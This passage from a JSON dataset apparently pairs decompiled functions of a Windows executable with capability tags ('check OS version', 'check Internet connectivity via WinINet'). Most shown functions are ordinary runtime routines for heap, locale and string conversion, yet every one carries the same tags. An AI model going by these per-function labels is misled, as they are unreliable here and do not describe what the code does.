arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.00402e60(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x45da34 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x00403943;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x00403943:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x45da24)) && (var_4h == *0x45da3c)) {\n        *0x45da24 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2100
    },
    "00403eba": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00403eba(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x45d801) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x45d100 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 131
    },
    "00404272": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404272(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x00404296:\n        if (*(uVar3 + 0x45ccb0) != arg_8h) goto code_r0x0040429e;\n        puVar8 = 0x45d800;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x45ccc0;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x45cca8);\n                    do {\n                        *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x45d904 = arg_8h;\n        *0x45d7f8 = 1;\n        *0x45d7f0 = fcn.00404010();\n        *0x45d910 = *(extraout_ECX + 0x45ccb4);\n        *0x45d914 = *(extraout_ECX + 0x45ccb8);\n        *0x45d918 = *(extraout_ECX + 0x45ccbc);\n        goto code_r0x004043eb;\n    }\ncode_r0x004043e6:\n    fcn.0040403f();\ncode_r0x004043eb:\n    fcn.00404068();\ncode_r0x004043f7:\n    fcn.00403eac();\n    return;\ncode_r0x0040429e:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x004042a9;\n    goto code_r0x00404296;\ncode_r0x004042a9:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x45d624 == 0) goto code_r0x004043f7;\n        goto code_r0x004043e6;\n    }\n    puVar8 = 0x45d800;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x45d904 = arg_8h;\n    *0x45d7f0 = 0;\n    if (lpCPInfo < 2) {\n        *0x45d7f8 = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x45d7f0 = fcn.00404010();\n        *0x45d7f8 = extraout_ECX_00;\n    }\n    *0x45d910 = 0;\n    *0x45d914 = 0;\n    *0x45d918 = 0;\n    goto code_r0x004043eb;\n}\n",
        "token_count": 1271
    },
    "00404c03": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c03(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_ch;\n    fcn.00401230(arg_8h, 0, 0x90);\n    if (*arg_ch != '\\0') {\n        if ((*arg_ch != '.') || (arg_ch[1] == '\\0')) {\n            arg_ch = NULL;\n            do {\n                uVar2 = fcn.00407f70(arg_8h_00, 0x40c0e0);\n                if (uVar2 == 0) {\n                    return 0xffffffff;\n                }\n                cVar1 = arg_8h_00[uVar2];\n                if (arg_ch == NULL) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h;\n                    if (cVar1 == '.') {\n                        return 0xffffffff;\n                    }\n                }\n                else if (arg_ch == 0x1) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if (cVar1 == '_') {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x40;\n                }\n                else {\n                    if (arg_ch != 0x2) {\n                        return 0xffffffff;\n                    }\n                    if (0xf < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if ((cVar1 != '\\0') && (cVar1 != ',')) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x80;\n                }\n                fcn.00403cc0(iVar3, arg_8h_00, uVar2);\n                if ((cVar1 == ',') || (cVar1 == '\\0')) {\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n                arg_8h_00 = arg_8h_00 + uVar2 + 1;\n            } while( true );\n        }\n        fcn.00403cc0(arg_8h + 0x80, arg_ch + 1, 0xf);\n        *(arg_8h + 0x8f) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 541
    },
    "00404cdf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404cdf(uint param_1, int32_t param_2)\n\n{\n    fcn.00403bc0(param_1, param_2);\n    if (*(param_2 + 0x40) != '\\0') {\n        fcn.00404bdf(param_1, 2, 0x40c0e8, param_2 + 0x40);\n    }\n    if (*(param_2 + 0x80) != '\\0') {\n        fcn.00404bdf(param_1, 2, 0x40c0e4, param_2 + 0x80);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00404d68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * fcn.00404d68(void)\n\n{\n    bool bVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar5 = 1;\n    bVar1 = true;\n    if ((*0x45cf3c != NULL) || (*0x45cf3c = fcn.0040162a(0x351),  puVar2 = *0x45cf3c,  *0x45cf3c != NULL)) {\n        **0x45cf3c = 0;\n        fcn.00404bdf(*0x45cf3c, 3, *0x45cf44, 0x40c100, *0x45cf48);\n        iVar4 = 0xc;\n        puVar3 = 0x45cf48;\n        do {\n            fcn.00403bd0(*0x45cf3c, 0x40c0fc);\n            iVar4 = fcn.00407fc0(*puVar3, *(iVar4 + 0x45cf48));\n            if (iVar4 != 0) {\n                bVar1 = false;\n            }\n            iVar5 = iVar5 + 1;\n            iVar4 = iVar5 * 0xc;\n            puVar3 = iVar4 + 0x45cf3c;\n            fcn.00404bdf(*0x45cf3c, 3, *(iVar4 + 0x45cf38), 0x40c100, *puVar3);\n        } while (iVar5 < 5);\n        puVar2 = *0x45cf3c;\n        if (bVar1) {\n            fcn.00401512(*0x45cf3c);\n            *0x45cf3c = NULL;\n            puVar2 = *0x45cf54;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 424
    },
    "00404e42": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404e42(char *param_1, uchar *param_2, ushort *param_3, uint *param_4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack152 [48];\n    uchar auStack104 [96];\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack104;\n    if (param_1 != NULL) {\n        if ((*param_1 == 'C') && (param_1[1] == '\\0')) {\n            *param_2 = 0x43;\n            param_2[1] = 0;\n            if (param_3 != NULL) {\n                *param_3 = 0;\n                param_3[1] = 0;\n                param_3[2] = 0;\n            }\n            if (param_4 != NULL) {\n                *param_4 = 0;\n            }\n        }\n        else {\n            uVar1 = fcn.00403df0(param_1);\n            if ((0x81 < uVar1) ||\n               ((iVar2 = fcn.00407fc0(0x45ceb0, param_1),  iVar2 != 0 &&\n                (iVar2 = fcn.00407fc0(0x45ce28, param_1),  iVar2 != 0)))) {\n                iVar2 = fcn.00404c03(auStack152, param_1);\n                if ((iVar2 != 0) || (iVar2 = fcn.0040879b(auStack152, 0x45d62c, auStack152),  iVar2 == 0))\n                goto code_r0x00404f91;\n                *0x45d634 = *0x45d630;\n                fcn.00404cdf(0x45ceb0, auStack152);\n                if ((*param_1 == '\\0') || (uVar1 = fcn.00403df0(param_1),  0x81 < uVar1)) {\n                    param_1 = 0x40bd9b;\n                }\n                *0x45ceaa = 0;\n                fcn.00403cc0(0x45ce28, param_1, 0x82);\n            }\n            if (param_3 != NULL) {\n                fcn.00404590(param_3, 0x45d62c, 6);\n            }\n            if (param_4 != NULL) {\n                fcn.00404590(param_4, 0x45d634, 4);\n            }\n            fcn.00403bc0(param_2, 0x45ceb0);\n        }\n    }\ncode_r0x00404f91:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 614
    },
    "00405236": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405236(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iStack152;\n    int32_t iStack144;\n    uchar auStack140 [16];\n    uchar auStack124 [116];\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack124;\n    if (param_1 != 0) {\n        if (param_2 != NULL) {\n            fcn.00404fa2(param_2);\n        }\n        goto code_r0x00405372;\n    }\n    bVar1 = true;\n    iStack144 = 0;\n    if (param_2 != NULL) {\n        if (((*param_2 == 'L') && (param_2[1] == 'C')) && (param_2[2] == '_')) {\n            do {\n                pcVar2 = fcn.00408a50(param_2, 0x40c104);\n                if (((pcVar2 == NULL) || (iVar3 = pcVar2 - param_2,  iVar3 == 0)) || (*pcVar2 == ';'))\n                goto code_r0x00405372;\n                iStack152 = 1;\n                puVar5 = 0x45cf44;\n                do {\n                    iVar4 = fcn.00408a10(*puVar5, param_2, iVar3);\n                    if ((iVar4 == 0) && (iVar4 = fcn.00403df0(*puVar5),  iVar3 == iVar4)) break;\n                    iStack152 = iStack152 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (puVar5 < 0x45cf75);\n                pcVar2 = pcVar2 + 1;\n                iVar3 = fcn.00407f70(pcVar2, 0x40c0fc);\n                if ((iVar3 == 0) && (*pcVar2 != ';')) goto code_r0x00405372;\n                if (iStack152 < 6) {\n                    fcn.00403cc0(auStack140, pcVar2, iVar3);\n                    auStack140[iVar3] = 0;\n                    iVar4 = fcn.00404fa2(auStack140);\n                    if (iVar4 != 0) {\n                        iStack144 = iStack144 + 1;\n                    }\n                }\n            } while ((pcVar2[iVar3] != '\\0') && (param_2 = pcVar2 + iVar3 + 1,  *param_2 != '\\0'));\n        }\n        else {\n            iVar3 = fcn.00404e42(param_2, auStack140, 0, 0, 0);\n            if (iVar3 == 0) goto code_r0x00405372;\n            puVar5 = 0x45cf3c;\n            do {\n                if (puVar5 != 0x45cf3c) {\n                    iVar3 = fcn.00407fc0(auStack140, *puVar5);\n                    if ((iVar3 == 0) || (iVar3 = fcn.00404fa2(auStack140),  iVar3 != 0)) {\n                        iStack144 = iStack144 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                    }\n                }\n                puVar5 = puVar5 + 3;\n            } while (puVar5 < 0x45cf79);\n            if (bVar1) {\n                fcn.00404d68();\n                fcn.00401512(*0x45cf3c);\n                *0x45cf3c = 0;\n                goto code_r0x00405372;\n            }\n        }\n        if (iStack144 == 0) goto code_r0x00405372;\n    }\n    fcn.00404d68();\ncode_r0x00405372:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 901
    },
    "0040565e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040565e(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x45d638) {\n        do {\n            if (*(iVar12 * 4 + 0x45d640) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45d680, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x45d640) == uVar10) goto code_r0x00405859;\n                iVar12 = *0x45d638 + -1;\n                if (iVar12 < 0) goto code_r0x00405847;\n                goto code_r0x00405837;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x45d638);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45d680, 1);\n    iVar12 = *0x45d638;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x45d638;\n    if (0 < *0x45d638) {\n        puVar8 = *0x45d638 * 4 + 0x45d63c;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x45d638 < 0x10) {\n            iVar7 = *0x45d638;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x45d640;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x45d638 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x45d680, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x00405837:\n        if (*(iVar12 * 4 + 0x45d640) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x00405847:\n        if (*0x45d638 < 0x10) {\n            *0x45d638 = *0x45d638 + 1;\n        }\n        iVar12 = *0x45d638 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x00405871;\ncode_r0x00405859:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x45d640;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x00405871:\n    (*pcVar3)(0x45d680, 0);\n    return 1;\n}\n",
        "token_count": 1634
    },
    "00405dff": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405dff(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40c128, 0x10);\n    if (*0x45da44 == 3) {\n        fcn.004029d8(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.00402a66(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00405e6c();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x00405e61;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x45da40, 0, *(unaff_EBP + 8));\ncode_r0x00405e61:\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 323
    },
    "00406450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.00406450(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint unaff_retaddr;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.004026d8();\n    iVar3 = 0;\n    if (*0x45d6ac == 0) {\n        var_38h = 0x40647a;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45d6ac = 2;\n            }\n        }\n        else {\n            *0x45d6ac = 1;\n        }\n    }\n    if ((*0x45d6ac == 2) || (*0x45d6ac == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x45d690;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x45d6a0;\n        }\n        noname_1_00 = fcn.00408a90(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.00408ad7(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x40c818, \n                                     0x1c, unaff_retaddr);\n                if (iVar3 == 0) goto code_r0x00406601;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x4065f2;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.00401512(iVar3);\n            }\n        }\n    }\n    else if (*0x45d6ac == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x45d6a0;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.00406450::lpCharType;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00402830();\n            *(unaff_EBP + -0x18) = &fcn.00406450::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.00406450::lpCharType;\n            fcn.00401230(&fcn.00406450::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.00404968(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x00406601;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00401512(arg_8h_00);\n            }\n        }\n    